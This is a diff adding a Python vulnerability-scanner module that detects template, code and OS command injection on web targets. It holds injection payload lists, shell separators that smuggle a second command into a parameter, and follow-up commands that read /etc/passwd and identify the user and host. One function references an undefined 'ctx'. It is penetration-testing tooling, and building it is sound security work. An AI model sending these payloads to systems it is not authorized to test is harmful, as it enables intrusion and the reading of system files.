@@ -1,0 +1,666 @@
+"""
+Command injection, server-side template injection and code evaluation.
+
+These three are grouped because they share one confirmation idea: make the
+server compute something it could only compute by *executing* what was sent,
+and look for the answer in the response. Nothing harmful is run — the proof is
+arithmetic.
+
+  * **Template injection** sends ``${7*191}`` and its relatives and looks for
+    1337 in the response. Each engine has its own syntax, and the syntax that
+    works identifies the engine, which is worth knowing: Jinja2 and Freemarker
+    are a short step from code execution, Smarty and Twig are further.
+
+  * **Code evaluation** does the same for a language's own expression syntax.
+
+  * **Command injection** runs real commands and reads their output back out
+    of the response. A timed sleep is kept only as a last resort, and a
+    finding that rests on timing alone is never called confirmed.
+
+The echo-based proofs are strong: no error handler, cache or WAF produces the
+number 1337 in response to ``${7*191}`` by accident.
+
+On command injection specifically, timing is the weakest thing in this file
+and the noisiest. Plenty of real applications are slow, slow in bursts, and
+slow in ways that correlate with how much data a request asks for — all of
+which can look like a sleep that scaled. So the command check now works the
+other way round: it proves execution by running ``id``, ``whoami``,
+``uname -a`` and ``cat /etc/passwd`` (or their Windows equivalents) and
+finding their output in the response. That output is the finding, it is the
+screenshot that goes in the report, and it is something the tester can
+reproduce by hand in one request.
+"""
+
+from __future__ import annotations
+
+import re
+import secrets
+
+from command_bridge.modules.scanner.model import Evidence, ScanFinding, \
+    response_summary, step
+from command_bridge.modules.scanner import oracles, grading
+
+#: 7 * 191 = 1337, which does not appear on a normal page the way 49 does.
+#: Except that it does. "1337" is four digits, and a page carrying a
+#: cache cookie, a nonce, an asset hash or a unix timestamp carries
+#: dozens of four-digit runs that change between responses — so a
+#: baseline without it and a test response with it is not evidence of
+#: anything. That is how one scan produced thirty-odd CONFIRMED command
+#: injections on header injection points behind a CDN.
+#:
+#: Kept only for the template and code checks, which confirm with a
+#: second, different product before reporting. The command check uses
+#: the randomised pair below.
+CANARY_RESULT = "1337"
+
+#: Smallest product the arithmetic oracle will accept. Six digits: a
+#: four-digit number appears by chance in ordinary page content, a
+#: six-digit one picked at random does not.
+_MIN_PRODUCT = 100_000
+
+
+def arithmetic_canary():
+    """``(a, b, product)`` — a multiplication nobody can predict.
+
+    The product is what the oracle looks for, so it has to be a number
+    that could not already be on the page. Random operands give a
+    different six- or seven-digit product on every test, which also
+    means a cached response from an earlier test cannot satisfy a later
+    one.
+    """
+    while True:
+        first = secrets.randbelow(600) + 400        # 400-999
+        second = secrets.randbelow(600) + 400
+        product = first * second
+        if product >= _MIN_PRODUCT:
+            return first, second, str(product)
+
+TEMPLATE_PAYLOADS = (
+    ("Jinja2 / Twig", "{{7*191}}"),
+    ("Jinja2 (statement)", "{{'7'*1}}{{7*191}}"),
+    ("Freemarker", "${7*191}"),
+    ("Velocity", "#set($x=7*191)$x"),
+    ("ERB / Ruby", "<%= 7*191 %>"),
+    ("Smarty", "{7*191}"),
+    ("Handlebars-style", "{{#with 7}}{{/with}}{{7*191}}"),
+    ("Angular / Vue", "{{constructor.constructor('return 7*191')()}}"),
+)
+
+CODE_PAYLOADS = (
+    ("PHP", ";print(7*191);"),
+    ("PHP", "');print(7*191);//"),
+    ("Python", "'+str(7*191)+'"),
+    ("Ruby", "#{7*191}"),
+    ("JavaScript", "';return 7*191;//"),
+)
+
+#: Separators that get a second command run.
+COMMAND_SEPARATORS = (";", "|", "||", "&&", "\n", "`{cmd}`", "$({cmd})")
+#: The arithmetic command, built per test around a random pair.
+COMMAND_ECHO_TEMPLATE = "expr {a} \\* {b}"
+COMMAND_TIME = "sleep {d}"
+WINDOWS_TIME = "ping -n {d} 127.0.0.1"
+
+#: The commands run once execution is established, purely to produce evidence.
+#: All of them read; none of them write, delete, connect outwards or touch
+#: anything a client would mind. ``/etc/passwd`` is the conventional proof and
+#: contains no password hashes on any system built this century, but it is
+#: truncated anyway — the first few lines prove the read, and the rest is the
+#: client's user list, which does not belong in a scanner's memory.
+UNIX_EVIDENCE = (
+    ("id", "id"),
+    ("whoami", "whoami"),
+    ("uname -a", "uname -a"),
+    ("pwd", "pwd"),
+    ("cat /etc/passwd", "head -n 5 /etc/passwd || cat /etc/passwd"),
+)
+
+WINDOWS_EVIDENCE = (
+    ("whoami", "whoami"),
+    ("ver", "ver"),
+    ("dir C:\\", "dir C:\\"),
+    ("type C:\\windows\\win.ini", "type C:\\windows\\win.ini"),
+)
+
+
+class TemplateInjectionCheck:
+    key = "ssti"
+    name = "Server-side template injection"
+    issue = "ssti"
+
+    def applies(self, point, profile):
+        return True
+
+    def run(self, ctx, point, baseline):
+        # If the page already carries the canary number (1337 appears inside
+        # cache cookies, asset hashes, CSS pixel values and timestamps all the
+        # time), this oracle cannot tell evaluation from the page's own
+        # content — don't run it here rather than report a coincidence.
+        baseline_body = getattr(baseline, "body", "") or ""
+        if CANARY_RESULT in baseline_body or "1146" in baseline_body:
+            return []
+        for engine, payload in TEMPLATE_PAYLOADS:
+            request = point.build(payload, mode="replace")
+            response = ctx.auth.send(request)
+            if response is None:
+                continue
+            body = response.text or ""
+            if CANARY_RESULT not in body:
+                continue
+            # The payload must not simply be echoed back: a page that reflects
+            # {{7*191}} verbatim has not evaluated anything.
+            if payload in body:
+                continue
+            confirm = point.build(payload.replace("7*191", "6*191"),
+                                  mode="replace")
+            second = ctx.auth.send(confirm)
+            if second is None or "1146" not in (second.text or ""):
+                continue
+            finding = ScanFinding(
+                issue=self.issue,
+                where=point.request.url,
+                point=point.label(),
+                method=point.request.method,
+                auth_context=grading.auth_context(ctx),
+                detail_extra=f"The template engine evaluated an expression "
+                             f"supplied in this parameter. The syntax that "
+                             f"worked points to {engine}. Two different "
+                             f"expressions were evaluated correctly, so this "
+                             f"is not a reflection.",
+                evidence=[
+                    step(f"{payload} evaluated to {CANARY_RESULT}",
+                         request, response, auth=ctx.auth, payload=payload,
+                         decisive=True, body_limit=300),
+                    step("A second expression, to rule out a coincidence",
+                         confirm, second, auth=ctx.auth, body_limit=300,
+                         note="6*191 = 1146")])
+            finding.add(grading.Signal(
+                grading.EXECUTION,
+                f"The server computed {payload} and returned "
+                f"{CANARY_RESULT}, then computed a second, different "
+                f"expression correctly. The expression was evaluated, not "
+                f"echoed — a reflected template string would have come back "
+                f"unchanged.",
+                {"payload": payload, "expected": CANARY_RESULT,
+                 "observed": CANARY_RESULT, "engine_hint": engine,
+                 "second_expression": "6*191", "second_expected": "1146"}))
+            finding.settle()
+            return [finding]
+        return []
+
+
+class CodeInjectionCheck:
+    key = "code"
+    name = "Server-side code injection"
+    issue = "code_injection"
+
+    def applies(self, point, profile):
+        return True
+
+    def run(self, ctx, point, baseline):
+        # Same guard as the template check: if 1337 is already on the page,
+        # its presence after injection proves nothing.
+        if CANARY_RESULT in (getattr(baseline, "body", "") or ""):
+            return []
+        for language, payload in CODE_PAYLOADS:
+            for mode in ("append", "replace"):
+                request = point.build(payload, mode)
+                response = ctx.auth.send(request)
+                if response is None:
+                    continue
+                body = response.text or ""
+                if CANARY_RESULT in body and payload not in body:
+                    finding = ScanFinding(
+                        issue=self.issue,
+                        where=point.request.url,
+                        point=point.label(),
+                        method=point.request.method,
+                        auth_context=grading.auth_context(ctx),
+                        detail_extra=f"An expression supplied in this "
+                                     f"parameter was evaluated by the "
+                                     f"application. The syntax suggests "
+                                     f"{language}.",
+                        evidence=[step(
+                            f"{payload} evaluated to {CANARY_RESULT}",
+                            request, response, auth=ctx.auth, payload=payload,
+                            decisive=True, body_limit=300)])
+                    finding.add(grading.Signal(
+                        grading.EXECUTION,
+                        f"The application computed {payload} and returned "
+                        f"{CANARY_RESULT}. The payload itself is not in the "
+                        f"response, so it was evaluated rather than "
+                        f"reflected.",
+                        {"payload": payload, "expected": CANARY_RESULT,
+                         "observed": CANARY_RESULT, "language_hint": language}))
+                    finding.settle()
+                    return [finding]
+        return []
+
+
+def _without_payload(body, payload):
+    """``body`` with every literal copy of the payload removed.
+
+    The anti-reflection rule this replaces was "if the payload came back,
+    nothing ran" — which is right about reflection and wrong about a whole
+    class of real target. A diagnostic endpoint typically prints the command
+    it ran *and then its output*:
+
+        $ ping -c 1 -W 1 127.0.0.1; echo CB4F2A91
+        ping: not found
+        CB4F2A91
+
+    The payload is in the page, so the old rule skipped it, and command
+    injection on exactly the kind of endpoint that usually has command
+    injection went unreported. Removing the echoed payload first keeps the
+    protection — a token that appears *only* inside the reflected payload
+    still disappears with it — while letting real output through.
+    """
+    if not payload:
+        return body or ""
+    cleaned = (body or "").replace(payload, " ")
+    # The payload may come back HTML-escaped, URL-encoded, or with its
+    # whitespace collapsed, so take those out too before deciding.
+    import html as _html
+    import urllib.parse as _url
+    for variant in (_html.escape(payload), _html.escape(payload, quote=False),
+                    _url.quote(payload), _url.quote_plus(payload),
+                    " ".join(payload.split())):
+        if variant and variant != payload:
+            cleaned = cleaned.replace(variant, " ")
+    return cleaned
+
+
+class CommandInjectionCheck:
+    """Prove the shell ran something, then make it say what it is.
+
+    The order matters and is the whole point of the rewrite. Execution is
+    established with a cheap, platform-neutral echo of a random token — no
+    arithmetic to confuse with page content, no sleep to confuse with a slow
+    server. Only once a separator is known to work does the check spend
+    requests running ``id``, ``whoami``, ``uname -a`` and ``cat /etc/passwd``,
+    and it records each one as its own evidence step so the report shows the
+    commands and their output side by side.
+    """
+
+    key = "cmdi"
+    name = "OS command injection"
+    issue = "command_injection"
+
+    def applies(self, point, profile):
+        return True
+
+    def run(self, ctx, point, baseline):
+        proven = self._execute(ctx, point, baseline)
+        if proven:
+            return [proven]
+        if getattr(ctx.profile, "timing_checks", False):
+            timed = self._timed(ctx, point, baseline)
+            if timed:
+                return [timed]
+        return []
+
+    # ── establishing that a shell ran ────────────────────────────────────
+    def _execute(self, ctx, point, baseline):
+        """Find a working separator, then capture real command output."""
+        canary = "CB" + secrets.token_hex(4).upper()
+        baseline_body = getattr(baseline, "body", "") or ""
+        first, second, product = arithmetic_canary()
+
+        for separator in COMMAND_SEPARATORS:
+            for command in (f"echo {canary}",
+                            COMMAND_ECHO_TEMPLATE.format(a=first, b=second)):
+                payload = (separator.format(cmd=command)
+                           if "{cmd}" in separator
+                           else f"{separator} {command}")
+                expected = canary if command.startswith("echo") else product
+                for mode in ("append", "replace"):
+                    request = point.build(payload, mode)
+                    response = ctx.auth.send(request)
+                    if response is None:
+                        continue
+                    body = response.text or ""
+                    if expected not in body:
+                        continue
+                    # Reflection is not execution — but an endpoint that
+                    # prints the command it ran is not reflection either.
+                    # Strip the echoed payload and ask whether the expected
+                    # output survives on its own.
+                    residue = _without_payload(body, payload)
+                    if expected not in residue:
+                        continue
+                    if f"echo {expected}" in residue:
+                        continue
+                    if expected in baseline_body:
+                        continue
+                    # THE GUARD THAT WAS MISSING. One baseline is one
+                    # sample. A page that carries a rotating cookie, a
+                    # nonce or a timestamp carries different digits in
+                    # every response, so "absent from the baseline,
+                    # present in this one" is a coincidence waiting to
+                    # be reported as a CRITICAL. Before believing it:
+                    #
+                    #   * send the same request with a harmless value
+                    #     and require the number NOT to come back, and
+                    #   * repeat the test with a DIFFERENT random pair
+                    #     and require the new product to come back.
+                    #
+                    # A coincidence passes neither. An executing shell
+                    # passes both.
+                    if not self._controlled(ctx, point, separator, mode,
+                                            command, expected):
+                        continue
+                    # Does this point simply reflect whatever is put in it?
+                    # A path segment echoed back in a canonical URL, a
+                    # breadcrumb or a 404 brings the whole payload — token and
+                    # all — back into the page in encodings the stripper above
+                    # cannot always anticipate. On such a point the echoed
+                    # token proves nothing; only real command output does.
+                    reflects = self._point_reflects_input(ctx, point)
+                    return self._capture(ctx, point, separator, mode,
+                                         request, response, payload,
+                                         command, expected, baseline_body,
+                                         reflects)
+        return None
+
+    def _point_reflects_input(self, ctx, point):
+        """True if a harmless sentinel put in this point comes back verbatim.
+
+        The sentinel is plain alphanumeric, so no HTML/URL encoding can alter
+        it on the way back — if it appears in the response, the endpoint
+        reflects its input and an echoed proof token cannot be trusted.
+        """
+        sentinel = "cbREFL" + secrets.token_hex(4)
+        for mode in ("append", "replace"):
+            try:
+                probe = ctx.auth.send(point.build(sentinel, mode))
+            except Exception:
+                probe = None
+            if probe is not None and sentinel in (probe.text or ""):
+                return True
+        return False
+
+    def _controlled(self, ctx, point, separator, mode, command, expected):
+        """Is the marker caused by the payload, or just present sometimes?
+
+        Two questions, both of which a coincidence fails.
+        """
+        # 1. A control request with nothing injected. If the number shows
+        #    up here too, the page simply contains numbers like it.
+        control = point.build("cb-control-" + secrets.token_hex(3), mode)
+        response = ctx.auth.send(control)
+        if response is None:
+            return False
+        if expected in (response.text or ""):
+            return False
+
+        # 2. The echo path carries its own unique token, so it needs no
+        #    second pair. The arithmetic path does: a fresh product that
+        #    nothing could have cached or guessed.
+        if command.startswith("echo"):
+            return True
+        first, second, product = arithmetic_canary()
+        while product == expected:
+            first, second, product = arithmetic_canary()
+        retest = COMMAND_ECHO_TEMPLATE.format(a=first, b=second)
+        payload = (separator.format(cmd=retest) if "{cmd}" in separator
+                   else f"{separator} {retest}")
+        again = ctx.auth.send(point.build(payload, mode))
+        if again is None:
+            return False
+        body = _without_payload(again.text or "", payload)
+        return product in body
+
+    # ── making it produce something worth screenshotting ─────────────────
+    def _capture(self, ctx, point, separator, mode, first_request,
+                 first_response, first_payload, first_command, expected,
+                 baseline_body, reflects=False):
+        """Run the read-only evidence commands through the proven separator."""
+        proof_step = step(
+            f"Shell execution proved with '{separator}'",
+            first_request, first_response, auth=ctx.auth,
+            payload=first_payload,
+            note=f"`{first_command}` printed {expected}. Nothing was written, "
+                 f"deleted or sent anywhere.")
+        evidence = [proof_step]
+
+        observations, platform = [], ""
+        for family, commands in (("unix", UNIX_EVIDENCE),
+                                 ("windows", WINDOWS_EVIDENCE)):
+            if platform and platform != family:
+                continue
+            for shown, actual in commands:
+                payload = (separator.format(cmd=actual)
+                           if "{cmd}" in separator
+                           else f"{separator} {actual}")
+                request = point.build(payload, mode)
+                response = ctx.auth.send(request)
+                if response is None:
+                    continue
+                body = response.text or ""
+                # Same correction as above: the command being printed back
+                # is normal for this kind of endpoint and is not reflection.
+                body = _without_payload(body, payload)
+                matches = oracles.command_output(body, baseline_body, payload)
+                matches = [m for m in matches if m[1] == family]
+                if not matches:
+                    continue
+                strong = oracles.decisive_command_output(matches)
+                description = (strong or matches[0])[2]
+                extract = (strong or matches[0])[3]
+                evidence.append(step(
+                    f"`{shown}` → {description}",
+                    request, response, auth=ctx.auth, payload=payload,
+                    note=f"Returned: {extract}", body_limit=800))
+                observations.append((shown, description, extract))
+                if strong is not None and not platform:
+                    platform = family
+            if platform == family:
+                break
+
+        # The decisive guard against the reflection false positive. When the
+        # point echoes its input, the proof token (and any arithmetic product)
+        # can be in the response with no shell involved. If no read-only
+        # command actually returned its output — the one thing reflection
+        # cannot fake — there is nothing here that can be told apart from
+        # reflection, so report nothing rather than a bogus CRITICAL. A real
+        # injection that returns command output still passes, because that
+        # output was never in the request.
+        if reflects and not observations:
+            return None
+
+        # Which step leads the proof of concept. The token echo is what
+        # *proved* execution, but the request worth putting in front of a
+        # client — and in a screenshot — is the one whose response contains
+        # `uid=0(root)` or the contents of /etc/passwd. So a step that
+        # returned real output leads where there is one, and the echo leads
+        # only when the injection turned out to be blind.
+        lead = next((item for item in evidence[1:]
+                     if item.label.startswith(("`cat", "`id", "`type"))),
+                    evidence[1] if len(evidence) > 1 else proof_step)
+        lead.decisive = True
+
+        if observations:
+            ran = ", ".join(f"`{name}`" for name, _, _ in observations)
+            detail = (
+                f"A second command supplied in this parameter was executed by "
+                f"the operating system. Execution was first proved by having "
+                f"the shell print a random token ({expected}), then "
+                f"demonstrated by running {ran} and reading the output back "
+                f"out of the response. "
+                + " ".join(f"{description.capitalize()}: {extract}"
+                           for _, description, extract in observations[:3])
+                + " Every command used was read-only.")
+        else:
+            # The shell ran, but this response does not return its output —
+            # blind injection. That is still command injection and still
+            # confirmed, and the report should not pretend there is a
+            # screenshot to take.
+            detail = (
+                f"A second command supplied in this parameter was executed by "
+                f"the operating system: the shell was asked to print the "
+                f"random token {expected} and the response contains it, while "
+                f"the payload itself was not reflected. Follow-up commands "
+                f"({', '.join(name for name, _ in UNIX_EVIDENCE)}) did not "
+                f"return their output in the response, so this is a blind "
+                f"injection — the command runs but the page does not show it. "
+                f"To screenshot it, re-send the proven request below with a "
+                f"command of your own.")
+
+        if oracles.COMMAND_ERRORS.search(first_response.text or ""):
+            detail += " The response also contains shell error output."
+
+        finding = ScanFinding(
+            issue=self.issue,
+            where=point.request.url,
+            point=point.label(),
+            method=point.request.method,
+            auth_context=grading.auth_context(ctx),
+            detail_extra=detail,
+            evidence=evidence)
+        # How strong this is depends on what came back, and it is not
+        # the same in both cases.
+        #
+        # A unique token (CB…) that the shell printed is an execution
+        # marker: nothing else produces that string. A NUMBER is weaker
+        # evidence even once controlled, and when no follow-up command
+        # returned output there is nothing but the number. Reporting
+        # that as CONFIRMED is what produced a finding that claimed
+        # confirmation in its rating and then explained in its own body
+        # that the follow-ups returned nothing — a contradiction the
+        # reader had to resolve.
+        #
+        # So: output from real commands, or a unique token, is EXECUTION.
+        # A controlled arithmetic result with no command output is a
+        # reproduced differential, which settles as potential rather
+        # than confirmed, and the body says what is missing.
+        arithmetic_only = (not observations
+                           and not first_command.startswith("echo"))
+        if arithmetic_only:
+            detail += (
+                " This rests on a computed value, reproduced with a second "
+                "unpredictable pair and absent from a control request — not "
+                "on the output of any command. It is reported as potential "
+                "for that reason: confirm it by hand before relying on it.")
+        finding.add(grading.Signal(
+            grading.DIFFERENTIAL if arithmetic_only else grading.EXECUTION,
+            f"A marker generated for this test ({expected}) was produced by "
+            f"server-side command execution and returned in the response. "
+            f"The payload itself is not reflected, so the shell ran it."
+            + (f" Follow-up commands then returned "
+               + ", ".join(f"{name} → {extract}"
+                           for name, _, extract in observations[:3])
+               if observations else
+               " Follow-up commands returned no output, so this is blind."),
+            {"marker": expected, "separator": separator,
+             "commands": [name for name, _, _ in observations]}))
+        finding.settle()
+        return finding
+
+    # ── the last resort ──────────────────────────────────────────────────
+    def _timed(self, ctx, point, baseline):
+        """A sleep that scaled — reported, but never as proof on its own.
+
+        A slow application is the normal case, not the exception, and a
+        timing result on one is not something a tester can put in front of a
+        client. So when timing fires, the check immediately tries to turn it
+        into real output through the same separator; if that works the
+        finding is upgraded to a confirmed one with the command output
+        attached. If it does not, the result is reported at tentative
+        confidence, which the evidence layer renders as POTENTIAL with
+        "manual validation required" rather than as a confirmed critical.
+        """
+        timing = oracles.Timing(ctx.auth, baseline, ctx.profile.delay_seconds)
+        for separator in (";", "|", "&&", "`{cmd}`", "$({cmd})"):
+            for command in (COMMAND_TIME, WINDOWS_TIME):
+                template = (separator.format(cmd=command)
+                            if "{cmd}" in separator
+                            else f"{separator} {command}")
+                for mode in ("append", "replace"):
+                    result = timing.test(point, template, mode)
+                    if not result:
+                        continue
+                    # Try to replace the timing argument with a real one.
+                    upgraded = self._capture_blind(ctx, point, separator, mode,
+                                                   baseline)
+                    if upgraded is not None:
+                        return upgraded
+                    if not getattr(ctx.profile, "report_timing_only", False):
+                        # The operator asked not to be shown these, because on
+                        # a slow application they are mostly the application
+                        # being slow. Nothing is reported.
+                        return None
+                    return self._timing_finding(point, result)
+        return None
+
+    def _capture_blind(self, ctx, point, separator, mode, baseline):
+        """Having found a separator by timing, see if it will talk."""
+        canary = "CB" + secrets.token_hex(4).upper()
+        baseline_body = getattr(baseline, "body", "") or ""
+        payload = (separator.format(cmd=f"echo {canary}")
+                   if "{cmd}" in separator
+                   else f"{separator} echo {canary}")
+        request = point.build(payload, mode)
+        response = ctx.auth.send(request)
+        if response is None:
+            return None
+        body = response.text or ""
+        if canary not in body or payload in body or f"echo {canary}" in body:
+            return None
+        return self._capture(ctx, point, separator, mode, request, response,
+                             payload, f"echo {canary}", canary, baseline_body)
+
+    def _timing_finding(self, point, result):
+        finding = ScanFinding(
+            issue=self.issue,
+            where=point.request.url,
+            point=point.label(),
+            method=point.request.method,
+            auth_context=grading.auth_context(ctx),
+            measurements={
+                "baseline_median_s": result["baseline_median"],
+                "baseline_ceiling_s": result["baseline_ceiling"],
+                "short_delay_s": result["short_delay"],
+                "short_time_s": result["short_time"],
+                "long_delay_s": result["long_delay"],
+                "long_time_s": result["long_time"],
+                "control_time_s": result.get("control_time"),
+            },
+            detail_extra=(
+                f"TIME-BASED EVIDENCE ONLY — MANUAL VALIDATION REQUIRED. "
+                f"Asking for {result['short_delay']}s took "
+                f"{result['short_time']}s and asking for "
+                f"{result['long_delay']}s took {result['long_time']}s, "
+                f"against a normal response time of "
+                f"{result['baseline_median']}s. The delay scaled with the "
+                f"number in the payload, which is what a real sleep looks "
+                f"like. No command output was recovered: a follow-up "
+                f"`echo` through the same separator returned nothing, so the "
+                f"scanner could not prove execution. On an application that "
+                f"is slow, or slow in proportion to how much work a request "
+                f"asks for, this pattern also occurs without any injection. "
+                f"Validate by hand before reporting it."),
+            evidence=[
+                step(f"{result['short_delay']}s requested → "
+                     f"{result['short_time']}s",
+                     result["short_request"], auth=result.get("auth"),
+                     payload=result.get("short_payload", "")),
+                step(f"{result['long_delay']}s requested → "
+                     f"{result['long_time']}s",
+                     result["long_request"], result.get("response"),
+                     auth=result.get("auth"),
+                     payload=result.get("long_payload", ""),
+                     decisive=True,
+                     note=f"Normal responses never exceeded "
+                          f"{result['baseline_ceiling']}s; a zero-second "
+                          f"sleep took {result.get('control_time', '?')}s. "
+                          f"This is circumstantial, not proof.")])
+        finding.add(grading.Signal(
+            grading.TIMING,
+            f"Asking for {result['short_delay']}s took "
+            f"{result['short_time']}s and asking for {result['long_delay']}s "
+            f"took {result['long_time']}s, against a baseline of "
+            f"{result['baseline_median']}s. An attempt to turn this into "
+            f"command output through the same separator returned nothing.",
+            dict(finding.measurements)))
+        finding.settle()
+        return finding
